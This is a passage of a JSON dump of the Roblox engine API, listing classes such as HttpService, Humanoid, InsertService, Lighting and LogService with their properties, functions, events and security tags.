uiService","type":"Event"},{"Arguments":[],"Name":"MenuClosed","tags":[],"Class":"GuiService","type":"Event"},{"Arguments":[],"Name":"MenuOpened","tags":[],"Class":"GuiService","type":"Event"},{"Arguments":[],"Name":"ShowLeaveConfirmation","tags":["RobloxScriptSecurity"],"Class":"GuiService","type":"Event"},{"Arguments":[{"Name":"key","Type":"SpecialKey"},{"Name":"modifiers","Type":"string"}],"Name":"SpecialKeyPressed","tags":["RobloxScriptSecurity"],"Class":"GuiService","type":"Event"},{"Arguments":[{"Name":"msgType","Type":"UiMessageType"},{"Name":"newUiMessage","Type":"string"}],"Name":"UiMessageChanged","tags":["RobloxScriptSecurity"],"Class":"GuiService","type":"Event"},{"ReturnType":"void","Arguments":[{"Name":"title","Type":"string"},{"Name":"text","Type":"string"}],"Name":"SendCoreUiNotification","tags":["RobloxScriptSecurity"],"Class":"GuiService","type":"Callback"},{"Superclass":"Instance","type":"Class","Name":"GuidRegistryService","tags":[]},{"Superclass":"Instance","type":"Class","Name":"HapticService","tags":["notCreatable"]},{"ReturnType":"Tuple","Arguments":[{"Type":"UserInputType","Name":"inputType","Default":null},{"Type":"VibrationMotor","Name":"vibrationMotor","Default":null}],"Name":"GetMotor","tags":[],"Class":"HapticService","type":"Function"},{"ReturnType":"bool","Arguments":[{"Type":"UserInputType","Name":"inputType","Default":null},{"Type":"VibrationMotor","Name":"vibrationMotor","Default":null}],"Name":"IsMotorSupported","tags":[],"Class":"HapticService","type":"Function"},{"ReturnType":"bool","Arguments":[{"Type":"UserInputType","Name":"inputType","Default":null}],"Name":"IsVibrationSupported","tags":[],"Class":"HapticService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"UserInputType","Name":"inputType","Default":null},{"Type":"VibrationMotor","Name":"vibrationMotor","Default":null},{"Type":"Tuple","Name":"vibrationValues","Default":null}],"Name":"SetMotor","tags":[],"Class":"HapticService","type":"Function"},{"Superclass":"Instance","type":"Class","Name":"HttpRbxApiService","tags":["notCreatable"]},{"ReturnType":"string","Arguments":[{"Type":"string","Name":"apiUrlPath","Default":null},{"Type":"bool","Name":"useHttps","Default":"true"},{"Type":"ThrottlingPriority","Name":"priority","Default":"Default"}],"Name":"GetAsync","tags":["RobloxScriptSecurity"],"Class":"HttpRbxApiService","type":"YieldFunction"},{"ReturnType":"string","Arguments":[{"Type":"string","Name":"apiUrlPath","Default":null},{"Type":"string","Name":"data","Default":null},{"Type":"bool","Name":"useHttps","Default":"true"},{"Type":"ThrottlingPriority","Name":"priority","Default":"Default"},{"Type":"HttpContentType","Name":"content_type","Default":"ApplicationJson"}],"Name":"PostAsync","tags":["RobloxScriptSecurity"],"Class":"HttpRbxApiService","type":"YieldFunction"},{"Superclass":"Instance","type":"Class","Name":"HttpService","tags":["notCreatable"]},{"ValueType":"bool","type":"Property","Name":"HttpEnabled","tags":["LocalUserSecurity"],"Class":"HttpService"},{"ReturnType":"string","Arguments":[{"Type":"bool","Name":"wrapInCurlyBraces","Default":"true"}],"Name":"GenerateGUID","tags":[],"Class":"HttpService","type":"Function"},{"ReturnType":"Variant","Arguments":[{"Type":"string","Name":"input","Default":null}],"Name":"JSONDecode","tags":[],"Class":"HttpService","type":"Function"},{"ReturnType":"string","Arguments":[{"Type":"Variant","Name":"input","Default":null}],"Name":"JSONEncode","tags":[],"Class":"HttpService","type":"Function"},{"ReturnType":"string","Arguments":[{"Type":"string","Name":"input","Default":null}],"Name":"UrlEncode","tags":[],"Class":"HttpService","type":"Function"},{"ReturnType":"string","Arguments":[{"Type":"string","Name":"url","Default":null},{"Type":"bool","Name":"nocache","Default":"false"}],"Name":"GetAsync","tags":[],"Class":"HttpService","type":"YieldFunction"},{"ReturnType":"string","Arguments":[{"Type":"string","Name":"url","Default":null},{"Type":"string","Name":"data","Default":null},{"Type":"HttpContentType","Name":"content_type","Default":"ApplicationJson"},{"Type":"bool","Name":"compress","Default":"false"}],"Name":"PostAsync","tags":[],"Class":"HttpService","type":"YieldFunction"},{"Superclass":"Instance","type":"Class","Name":"Humanoid","tags":[]},{"ValueType":"bool","type":"Property","Name":"AutoJumpEnabled","tags":[],"Class":"Humanoid"},{"ValueType":"bool","type":"Property","Name":"AutoRotate","tags":[],"Class":"Humanoid"},{"ValueType":"Vector3","type":"Property","Name":"CameraOffset","tags":[],"Class":"Humanoid"},{"ValueType":"HumanoidDisplayDistanceType","type":"Property","Name":"DisplayDistanceType","tags":[],"Class":"Humanoid"},{"ValueType":"float","type":"Property","Name":"Health","tags":[],"Class":"Humanoid"},{"ValueType":"float","type":"Property","Name":"HealthDisplayDistance","tags":[],"Class":"Humanoid"},{"ValueType":"float","type":"Property","Name":"HipHeight","tags":[],"Class":"Humanoid"},{"ValueType":"bool","type":"Property","Name":"Jump","tags":[],"Class":"Humanoid"},{"ValueType":"float","type":"Property","Name":"JumpPower","tags":[],"Class":"Humanoid"},{"ValueType":"Object","type":"Property","Name":"LeftLeg","tags":[],"Class":"Humanoid"},{"ValueType":"float","type":"Property","Name":"MaxHealth","tags":[],"Class":"Humanoid"},{"ValueType":"float","type":"Property","Name":"MaxSlopeAngle","tags":[],"Class":"Humanoid"},{"ValueType":"Vector3","type":"Property","Name":"MoveDirection","tags":["readonly"],"Class":"Humanoid"},{"ValueType":"float","type":"Property","Name":"NameDisplayDistance","tags":[],"Class":"Humanoid"},{"ValueType":"NameOcclusion","type":"Property","Name":"NameOcclusion","tags":[],"Class":"Humanoid"},{"ValueType":"bool","type":"Property","Name":"PlatformStand","tags":[],"Class":"Humanoid"},{"ValueType":"HumanoidRigType","type":"Property","Name":"RigType","tags":[],"Class":"Humanoid"},{"ValueType":"Object","type":"Property","Name":"RightLeg","tags":[],"Class":"Humanoid"},{"ValueType":"Object","type":"Property","Name":"SeatPart","tags":["readonly"],"Class":"Humanoid"},{"ValueType":"bool","type":"Property","Name":"Sit","tags":[],"Class":"Humanoid"},{"ValueType":"Vector3","type":"Property","Name":"TargetPoint","tags":[],"Class":"Humanoid"},{"ValueType":"Object","type":"Property","Name":"Torso","tags":[],"Class":"Humanoid"},{"ValueType":"float","type":"Property","Name":"WalkSpeed","tags":[],"Class":"Humanoid"},{"ValueType":"Object","type":"Property","Name":"WalkToPart","tags":[],"Class":"Humanoid"},{"ValueType":"Vector3","type":"Property","Name":"WalkToPoint","tags":[],"Class":"Humanoid"},{"ValueType":"float","type":"Property","Name":"maxHealth","tags":["deprecated"],"Class":"Humanoid"},{"ReturnType":"bool","Arguments":[{"Type":"string","Name":"status","Default":null}],"Name":"AddCustomStatus","tags":["deprecated"],"Class":"Humanoid","type":"Function"},{"ReturnType":"bool","Arguments":[{"Type":"Status","Name":"status","Default":"Poison"}],"Name":"AddStatus","tags":["deprecated"],"Class":"Humanoid","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"HumanoidStateType","Name":"state","Default":"None"}],"Name":"ChangeState","tags":[],"Class":"Humanoid","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Instance","Name":"tool","Default":null}],"Name":"EquipTool","tags":[],"Class":"Humanoid","type":"Function"},{"ReturnType":"Array","Arguments":[],"Name":"GetPlayingAnimationTracks","tags":[],"Class":"Humanoid","type":"Function"},{"ReturnType":"HumanoidStateType","Arguments":[],"Name":"GetState","tags":[],"Class":"Humanoid","type":"Function"},{"ReturnType":"bool","Arguments":[{"Type":"HumanoidStateType","Name":"state","Default":null}],"Name":"GetStateEnabled","tags":[],"Class":"Humanoid","type":"Function"},{"ReturnType":"Array","Arguments":[],"Name":"GetStatuses","tags":["deprecated"],"Class":"Humanoid","type":"Function"},{"ReturnType":"bool","Arguments":[{"Type":"string","Name":"status","Default":null}],"Name":"HasCustomStatus","tags":["deprecated"],"Class":"Humanoid","type":"Function"},{"ReturnType":"bool","Arguments":[{"Type":"Status","Name":"status","Default":"Poison"}],"Name":"HasStatus","tags":["deprecated"],"Class":"Humanoid","type":"Function"},{"ReturnType":"Instance","Arguments":[{"Type":"Instance","Name":"animation","Default":null}],"Name":"LoadAnimation","tags":[],"Class":"Humanoid","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Vector3","Name":"moveDirection","Default":null},{"Type":"bool","Name":"relativeToCamera","Default":"false"}],"Name":"Move","tags":[],"Class":"Humanoid","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Vector3","Name":"location","Default":null},{"Type":"Instance","Name":"part","Default":"nil"}],"Name":"MoveTo","tags":[],"Class":"Humanoid","type":"Function"},{"ReturnType":"bool","Arguments":[{"Type":"string","Name":"status","Default":null}],"Name":"RemoveCustomStatus","tags":["deprecated"],"Class":"Humanoid","type":"Function"},{"ReturnType":"bool","Arguments":[{"Type":"Status","Name":"status","Default":"Poison"}],"Name":"RemoveStatus","tags":["deprecated"],"Class":"Humanoid","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"bool","Name":"enabled","Default":null}],"Name":"SetClickToWalkEnabled","tags":["RobloxScriptSecurity"],"Class":"Humanoid","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"HumanoidStateType","Name":"state","Default":null},{"Type":"bool","Name":"enabled","Default":null}],"Name":"SetStateEnabled","tags":[],"Class":"Humanoid","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"float","Name":"amount","Default":null}],"Name":"TakeDamage","tags":[],"Class":"Humanoid","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"UnequipTools","tags":[],"Class":"Humanoid","type":"Function"},{"ReturnType":"Instance","Arguments":[{"Type":"Instance","Name":"animation","Default":null}],"Name":"loadAnimation","tags":["deprecated"],"Class":"Humanoid","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"float","Name":"amount","Default":null}],"Name":"takeDamage","tags":["deprecated"],"Class":"Humanoid","type":"Function"},{"Arguments":[{"Name":"animationTrack","Type":"Instance"}],"Name":"AnimationPlayed","tags":[],"Class":"Humanoid","type":"Event"},{"Arguments":[{"Name":"speed","Type":"float"}],"Name":"Climbing","tags":[],"Class":"Humanoid","type":"Event"},{"Arguments":[{"Name":"status","Type":"string"}],"Name":"CustomStatusAdded","tags":["deprecated"],"Class":"Humanoid","type":"Event"},{"Arguments":[{"Name":"status","Type":"string"}],"Name":"CustomStatusRemoved","tags":["deprecated"],"Class":"Humanoid","type":"Event"},{"Arguments":[],"Name":"Died","tags":[],"Class":"Humanoid","type":"Event"},{"Arguments":[{"Name":"active","Type":"bool"}],"Name":"FallingDown","tags":[],"Class":"Humanoid","type":"Event"},{"Arguments":[{"Name":"active","Type":"bool"}],"Name":"FreeFalling","tags":[],"Class":"Humanoid","type":"Event"},{"Arguments":[{"Name":"active","Type":"bool"}],"Name":"GettingUp","tags":[],"Class":"Humanoid","type":"Event"},{"Arguments":[{"Name":"health","Type":"float"}],"Name":"HealthChanged","tags":[],"Class":"Humanoid","type":"Event"},{"Arguments":[{"Name":"active","Type":"bool"}],"Name":"Jumping","tags":[],"Class":"Humanoid","type":"Event"},{"Arguments":[{"Name":"reached","Type":"bool"}],"Name":"MoveToFinished","tags":[],"Class":"Humanoid","type":"Event"},{"Arguments":[{"Name":"active","Type":"bool"}],"Name":"PlatformStanding","tags":[],"Class":"Humanoid","type":"Event"},{"Arguments":[{"Name":"active","Type":"bool"}],"Name":"Ragdoll","tags":[],"Class":"Humanoid","type":"Event"},{"Arguments":[{"Name":"speed","Type":"float"}],"Name":"Running","tags":[],"Class":"Humanoid","type":"Event"},{"Arguments":[{"Name":"active","Type":"bool"},{"Name":"currentSeatPart","Type":"Instance"}],"Name":"Seated","tags":[],"Class":"Humanoid","type":"Event"},{"Arguments":[{"Name":"old","Type":"HumanoidStateType"},{"Name":"new","Type":"HumanoidStateType"}],"Name":"StateChanged","tags":[],"Class":"Humanoid","type":"Event"},{"Arguments":[{"Name":"state","Type":"HumanoidStateType"},{"Name":"isEnabled","Type":"bool"}],"Name":"StateEnabledChanged","tags":[],"Class":"Humanoid","type":"Event"},{"Arguments":[{"Name":"status","Type":"Status"}],"Name":"StatusAdded","tags":["deprecated"],"Class":"Humanoid","type":"Event"},{"Arguments":[{"Name":"status","Type":"Status"}],"Name":"StatusRemoved","tags":["deprecated"],"Class":"Humanoid","type":"Event"},{"Arguments":[{"Name":"active","Type":"bool"}],"Name":"Strafing","tags":[],"Class":"Humanoid","type":"Event"},{"Arguments":[{"Name":"speed","Type":"float"}],"Name":"Swimming","tags":[],"Class":"Humanoid","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"InputObject","tags":["notCreatable"]},{"ValueType":"Vector3","type":"Property","Name":"Delta","tags":[],"Class":"InputObject"},{"ValueType":"KeyCode","type":"Property","Name":"KeyCode","tags":[],"Class":"InputObject"},{"ValueType":"Vector3","type":"Property","Name":"Position","tags":[],"Class":"InputObject"},{"ValueType":"UserInputState","type":"Property","Name":"UserInputState","tags":[],"Class":"InputObject"},{"ValueType":"UserInputType","type":"Property","Name":"UserInputType","tags":[],"Class":"InputObject"},{"Superclass":"Instance","type":"Class","Name":"InsertService","tags":["notCreatable"]},{"ValueType":"bool","type":"Property","Name":"AllowInsertFreeModels","tags":[],"Class":"InsertService"},{"ReturnType":"void","Arguments":[{"Type":"int","Name":"assetId","Default":null}],"Name":"ApproveAssetId","tags":["deprecated"],"Class":"InsertService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"int","Name":"assetVersionId","Default":null}],"Name":"ApproveAssetVersionId","tags":["deprecated"],"Class":"InsertService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Instance","Name":"instance","Default":null}],"Name":"Insert","tags":["deprecated"],"Class":"InsertService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"bool","Name":"enable","Default":null},{"Type":"bool","Name":"user","Default":"false"}],"Name":"SetAdvancedResults","tags":["LocalUserSecurity"],"Class":"InsertService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"assetUrl","Default":null}],"Name":"SetAssetUrl","tags":["LocalUserSecurity"],"Class":"InsertService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"assetVersionUrl","Default":null}],"Name":"SetAssetVersionUrl","tags":["LocalUserSecurity"],"Class":"InsertService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"baseSetsUrl","Default":null}],"Name":"SetBaseCategoryUrl","tags":["LocalUserSecurity"],"Class":"InsertService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"baseSetsUrl","Default":null}],"Name":"SetBaseSetsUrl","tags":["LocalUserSecurity"],"Class":"InsertService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"collectionUrl","Default":null}],"Name":"SetCollectionUrl","tags":["LocalUserSecurity"],"Class":"InsertService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"freeDecalUrl","Default":null}],"Name":"SetFreeDecalUrl","tags":["LocalUserSecurity"],"Class":"InsertService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"freeModelUrl","Default":null}],"Name":"SetFreeModelUrl","tags":["LocalUserSecurity"],"Class":"InsertService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"float","Name":"trustLevel","Default":null}],"Name":"SetTrustLevel","tags":["LocalUserSecurity"],"Class":"InsertService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"userSetsUrl","Default":null}],"Name":"SetUserCategoryUrl","tags":["LocalUserSecurity"],"Class":"InsertService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"userSetsUrl","Default":null}],"Name":"SetUserSetsUrl","tags":["LocalUserSecurity"],"Class":"InsertService","type":"Function"},{"ReturnType":"Array","Arguments":[],"Name":"GetBaseCategories","tags":["deprecated"],"Class":"InsertService","type":"YieldFunction"},{"ReturnType":"Array","Arguments":[],"Name":"GetBaseSets","tags":[],"Class":"InsertService","type":"YieldFunction"},{"ReturnType":"Array","Arguments":[{"Type":"int","Name":"categoryId","Default":null}],"Name":"GetCollection","tags":[],"Class":"InsertService","type":"YieldFunction"},{"ReturnType":"Array","Arguments":[{"Type":"string","Name":"searchText","Default":null},{"Type":"int","Name":"pageNum","Default":null}],"Name":"GetFreeDecals","tags":[],"Class":"InsertService","type":"YieldFunction"},{"ReturnType":"Array","Arguments":[{"Type":"string","Name":"searchText","Default":null},{"Type":"int","Name":"pageNum","Default":null}],"Name":"GetFreeModels","tags":[],"Class":"InsertService","type":"YieldFunction"},{"ReturnType":"int","Arguments":[{"Type":"int","Name":"assetId","Default":null}],"Name":"GetLatestAssetVersionAsync","tags":[],"Class":"InsertService","type":"YieldFunction"},{"ReturnType":"Array","Arguments":[{"Type":"int","Name":"userId","Default":null}],"Name":"GetUserCategories","tags":["deprecated"],"Class":"InsertService","type":"YieldFunction"},{"ReturnType":"Array","Arguments":[{"Type":"int","Name":"userId","Default":null}],"Name":"GetUserSets","tags":[],"Class":"InsertService","type":"YieldFunction"},{"ReturnType":"Instance","Arguments":[{"Type":"int","Name":"assetId","Default":null}],"Name":"LoadAsset","tags":[],"Class":"InsertService","type":"YieldFunction"},{"ReturnType":"Instance","Arguments":[{"Type":"int","Name":"assetVersionId","Default":null}],"Name":"LoadAssetVersion","tags":[],"Class":"InsertService","type":"YieldFunction"},{"ReturnType":"Instance","Arguments":[{"Type":"int","Name":"assetId","Default":null}],"Name":"loadAsset","tags":["deprecated"],"Class":"InsertService","type":"YieldFunction"},{"Superclass":"Instance","type":"Class","Name":"InstancePacketCache","tags":[]},{"Superclass":"Instance","type":"Class","Name":"IntConstrainedValue","tags":[]},{"ValueType":"int","type":"Property","Name":"ConstrainedValue","tags":["hidden"],"Class":"IntConstrainedValue"},{"ValueType":"int","type":"Property","Name":"MaxValue","tags":[],"Class":"IntConstrainedValue"},{"ValueType":"int","type":"Property","Name":"MinValue","tags":[],"Class":"IntConstrainedValue"},{"ValueType":"int","type":"Property","Name":"Value","tags":[],"Class":"IntConstrainedValue"},{"Arguments":[{"Name":"value","Type":"int"}],"Name":"Changed","tags":[],"Class":"IntConstrainedValue","type":"Event"},{"Arguments":[{"Name":"value","Type":"int"}],"Name":"changed","tags":["deprecated"],"Class":"IntConstrainedValue","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"IntValue","tags":[]},{"ValueType":"int","type":"Property","Name":"Value","tags":[],"Class":"IntValue"},{"Arguments":[{"Name":"value","Type":"int"}],"Name":"Changed","tags":[],"Class":"IntValue","type":"Event"},{"Arguments":[{"Name":"value","Type":"int"}],"Name":"changed","tags":["deprecated"],"Class":"IntValue","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"JointInstance","tags":[]},{"ValueType":"CoordinateFrame","type":"Property","Name":"C0","tags":[],"Class":"JointInstance"},{"ValueType":"CoordinateFrame","type":"Property","Name":"C1","tags":[],"Class":"JointInstance"},{"ValueType":"Object","type":"Property","Name":"Part0","tags":[],"Class":"JointInstance"},{"ValueType":"Object","type":"Property","Name":"Part1","tags":[],"Class":"JointInstance"},{"ValueType":"Object","type":"Property","Name":"part1","tags":["deprecated","hidden"],"Class":"JointInstance"},{"Superclass":"JointInstance","type":"Class","Name":"DynamicRotate","tags":[]},{"ValueType":"float","type":"Property","Name":"BaseAngle","tags":[],"Class":"DynamicRotate"},{"Superclass":"DynamicRotate","type":"Class","Name":"RotateP","tags":[]},{"Superclass":"DynamicRotate","type":"Class","Name":"RotateV","tags":[]},{"Superclass":"JointInstance","type":"Class","Name":"Glue","tags":[]},{"ValueType":"Vector3","type":"Property","Name":"F0","tags":[],"Class":"Glue"},{"ValueType":"Vector3","type":"Property","Name":"F1","tags":[],"Class":"Glue"},{"ValueType":"Vector3","type":"Property","Name":"F2","tags":[],"Class":"Glue"},{"ValueType":"Vector3","type":"Property","Name":"F3","tags":[],"Class":"Glue"},{"Superclass":"JointInstance","type":"Class","Name":"ManualSurfaceJointInstance","tags":[]},{"Superclass":"ManualSurfaceJointInstance","type":"Class","Name":"ManualGlue","tags":[]},{"Superclass":"ManualSurfaceJointInstance","type":"Class","Name":"ManualWeld","tags":[]},{"Superclass":"JointInstance","type":"Class","Name":"Motor","tags":[]},{"ValueType":"float","type":"Property","Name":"CurrentAngle","tags":[],"Class":"Motor"},{"ValueType":"float","type":"Property","Name":"DesiredAngle","tags":[],"Class":"Motor"},{"ValueType":"float","type":"Property","Name":"MaxVelocity","tags":[],"Class":"Motor"},{"ReturnType":"void","Arguments":[{"Type":"float","Name":"value","Default":null}],"Name":"SetDesiredAngle","tags":[],"Class":"Motor","type":"Function"},{"Superclass":"Motor","type":"Class","Name":"Motor6D","tags":[]},{"Superclass":"JointInstance","type":"Class","Name":"Rotate","tags":[]},{"Superclass":"JointInstance","type":"Class","Name":"Snap","tags":[]},{"Superclass":"JointInstance","type":"Class","Name":"VelocityMotor","tags":[]},{"ValueType":"float","type":"Property","Name":"CurrentAngle","tags":[],"Class":"VelocityMotor"},{"ValueType":"float","type":"Property","Name":"DesiredAngle","tags":[],"Class":"VelocityMotor"},{"ValueType":"Object","type":"Property","Name":"Hole","tags":[],"Class":"VelocityMotor"},{"ValueType":"float","type":"Property","Name":"MaxVelocity","tags":[],"Class":"VelocityMotor"},{"Superclass":"JointInstance","type":"Class","Name":"Weld","tags":[]},{"Superclass":"Instance","type":"Class","Name":"JointsService","tags":["notCreatable"]},{"ReturnType":"void","Arguments":[],"Name":"ClearJoinAfterMoveJoints","tags":[],"Class":"JointsService","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"CreateJoinAfterMoveJoints","tags":[],"Class":"JointsService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Instance","Name":"joinInstance","Default":null}],"Name":"SetJoinAfterMoveInstance","tags":[],"Class":"JointsService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Instance","Name":"joinTarget","Default":null}],"Name":"SetJoinAfterMoveTarget","tags":[],"Class":"JointsService","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"ShowPermissibleJoints","tags":[],"Class":"JointsService","type":"Function"},{"Superclass":"Instance","type":"Class","Name":"Keyframe","tags":[]},{"ValueType":"float","type":"Property","Name":"Time","tags":[],"Class":"Keyframe"},{"ReturnType":"void","Arguments":[{"Type":"Instance","Name":"pose","Default":null}],"Name":"AddPose","tags":[],"Class":"Keyframe","type":"Function"},{"ReturnType":"Objects","Arguments":[],"Name":"GetPoses","tags":[],"Class":"Keyframe","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Instance","Name":"pose","Default":null}],"Name":"RemovePose","tags":[],"Class":"Keyframe","type":"Function"},{"Superclass":"Instance","type":"Class","Name":"KeyframeSequence","tags":[]},{"ValueType":"bool","type":"Property","Name":"Loop","tags":[],"Class":"KeyframeSequence"},{"ValueType":"AnimationPriority","type":"Property","Name":"Priority","tags":[],"Class":"KeyframeSequence"},{"ReturnType":"void","Arguments":[{"Type":"Instance","Name":"keyframe","Default":null}],"Name":"AddKeyframe","tags":[],"Class":"KeyframeSequence","type":"Function"},{"ReturnType":"Objects","Arguments":[],"Name":"GetKeyframes","tags":[],"Class":"KeyframeSequence","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Instance","Name":"keyframe","Default":null}],"Name":"RemoveKeyframe","tags":[],"Class":"KeyframeSequence","type":"Function"},{"Superclass":"Instance","type":"Class","Name":"KeyframeSequenceProvider","tags":[]},{"ReturnType":"Instance","Arguments":[{"Type":"Content","Name":"assetId","Default":null}],"Name":"GetKeyframeSequence","tags":[],"Class":"KeyframeSequenceProvider","type":"Function"},{"ReturnType":"Instance","Arguments":[{"Type":"int","Name":"assetId","Default":null},{"Type":"bool","Name":"useCache","Default":null}],"Name":"GetKeyframeSequenceById","tags":[],"Class":"KeyframeSequenceProvider","type":"Function"},{"ReturnType":"Content","Arguments":[{"Type":"Instance","Name":"keyframeSequence","Default":null}],"Name":"RegisterActiveKeyframeSequence","tags":[],"Class":"KeyframeSequenceProvider","type":"Function"},{"ReturnType":"Content","Arguments":[{"Type":"Instance","Name":"keyframeSequence","Default":null}],"Name":"RegisterKeyframeSequence","tags":[],"Class":"KeyframeSequenceProvider","type":"Function"},{"ReturnType":"Dictionary","Arguments":[{"Type":"int","Name":"userId","Default":null},{"Type":"int","Name":"page","Default":"1"}],"Name":"GetAnimations","tags":[],"Class":"KeyframeSequenceProvider","type":"YieldFunction"},{"Superclass":"Instance","type":"Class","Name":"Light","tags":[]},{"ValueType":"float","type":"Property","Name":"Brightness","tags":[],"Class":"Light"},{"ValueType":"Color3","type":"Property","Name":"Color","tags":[],"Class":"Light"},{"ValueType":"bool","type":"Property","Name":"Enabled","tags":[],"Class":"Light"},{"ValueType":"bool","type":"Property","Name":"Shadows","tags":[],"Class":"Light"},{"Superclass":"Light","type":"Class","Name":"PointLight","tags":[]},{"ValueType":"float","type":"Property","Name":"Range","tags":[],"Class":"PointLight"},{"Superclass":"Light","type":"Class","Name":"SpotLight","tags":[]},{"ValueType":"float","type":"Property","Name":"Angle","tags":[],"Class":"SpotLight"},{"ValueType":"NormalId","type":"Property","Name":"Face","tags":[],"Class":"SpotLight"},{"ValueType":"float","type":"Property","Name":"Range","tags":[],"Class":"SpotLight"},{"Superclass":"Light","type":"Class","Name":"SurfaceLight","tags":[]},{"ValueType":"float","type":"Property","Name":"Angle","tags":[],"Class":"SurfaceLight"},{"ValueType":"NormalId","type":"Property","Name":"Face","tags":[],"Class":"SurfaceLight"},{"ValueType":"float","type":"Property","Name":"Range","tags":[],"Class":"SurfaceLight"},{"Superclass":"Instance","type":"Class","Name":"Lighting","tags":["notCreatable"]},{"ValueType":"Color3","type":"Property","Name":"Ambient","tags":[],"Class":"Lighting"},{"ValueType":"float","type":"Property","Name":"Brightness","tags":[],"Class":"Lighting"},{"ValueType":"Color3","type":"Property","Name":"ColorShift_Bottom","tags":[],"Class":"Lighting"},{"ValueType":"Color3","type":"Property","Name":"ColorShift_Top","tags":[],"Class":"Lighting"},{"ValueType":"Color3","type":"Property","Name":"FogColor","tags":[],"Class":"Lighting"},{"ValueType":"float","type":"Property","Name":"FogEnd","tags":[],"Class":"Lighting"},{"ValueType":"float","type":"Property","Name":"FogStart","tags":[],"Class":"Lighting"},{"ValueType":"float","type":"Property","Name":"GeographicLatitude","tags":[],"Class":"Lighting"},{"ValueType":"bool","type":"Property","Name":"GlobalShadows","tags":[],"Class":"Lighting"},{"ValueType":"Color3","type":"Property","Name":"OutdoorAmbient","tags":[],"Class":"Lighting"},{"ValueType":"bool","type":"Property","Name":"Outlines","tags":[],"Class":"Lighting"},{"ValueType":"Color3","type":"Property","Name":"ShadowColor","tags":[],"Class":"Lighting"},{"ValueType":"string","type":"Property","Name":"TimeOfDay","tags":[],"Class":"Lighting"},{"ReturnType":"double","Arguments":[],"Name":"GetMinutesAfterMidnight","tags":[],"Class":"Lighting","type":"Function"},{"ReturnType":"Vector3","Arguments":[],"Name":"GetMoonDirection","tags":[],"Class":"Lighting","type":"Function"},{"ReturnType":"float","Arguments":[],"Name":"GetMoonPhase","tags":[],"Class":"Lighting","type":"Function"},{"ReturnType":"Vector3","Arguments":[],"Name":"GetSunDirection","tags":[],"Class":"Lighting","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"double","Name":"minutes","Default":null}],"Name":"SetMinutesAfterMidnight","tags":[],"Class":"Lighting","type":"Function"},{"ReturnType":"double","Arguments":[],"Name":"getMinutesAfterMidnight","tags":["deprecated"],"Class":"Lighting","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"double","Name":"minutes","Default":null}],"Name":"setMinutesAfterMidnight","tags":["deprecated"],"Class":"Lighting","type":"Function"},{"Arguments":[{"Name":"skyboxChanged","Type":"bool"}],"Name":"LightingChanged","tags":[],"Class":"Lighting","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"LocalWorkspace","tags":["notCreatable"]},{"Superclass":"Instance","type":"Class","Name":"LogService","tags":["notCreatable"]},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"source","Default":null}],"Name":"ExecuteScript","tags":["RobloxScriptSecurity"],"Class":"LogService","type":"Function"},{"ReturnType":"Array","Arguments":[],"Name":"GetLogHistory","tags":[],"Class":"LogService","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"RequestServerOutput","tags":["RobloxScriptSecurity"],"Class":"LogService","type":"Function"},{"Arguments":[{"Name":"message","Type":"string"},{"Name":"messageType","Type":"MessageType"}],"Name":"MessageOut","tags":[],"Class":"LogService","type":"Event"},{"Arguments":[{"Name":"message","Type":"string"},{"Name":"messageType","Type":"MessageType"},{"Name":"timestamp","Type":"int"}],"Name":"ServerMessageOut","tags":["RobloxScriptSecurity"],"Class":"LogService","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"LoginService","tags":[]},{"ReturnType":"void","Arguments":[],"Name":"Logout","tags":["RobloxSecurity"],"Class":"LoginService","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"PromptLogin","tags":["RobloxSecurity"],"Class":"LoginService","type":"Function"},{"Arguments":[{"Name":"loginError","Type":"string"}],"Name":"LoginFailed","tags":["RobloxSecurity"],"Class":"LoginService","type":"Event"},{"Arguments":[{"Name":"username","Type":"string"}],"Name":"LoginSucceeded","tags":["RobloxSecurity"],"Class":"LoginService","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"LuaSettings","tags":[]},{"ValueType":"bool","type":"Property","Name":"AreScriptStartsReported","tags":[],"Class":"LuaSettings"},{"ValueType":"double","type":"Property","Name":"DefaultWaitTime","tags":[],"Class":"LuaSettings"},{"ValueType":"int","type":"Property","Name":"GcFrequency","tags":[],"Class":"LuaSettings"},{"ValueType":"int","type":"Property","Name":"GcLimit","tags":[],"Class":"LuaSettings"},{"ValueType":"int","type":"Property","Name":"GcPause","tags":[],"Class":"LuaSettings"},{"ValueType":"int","type":"Property","Name":"GcStepMul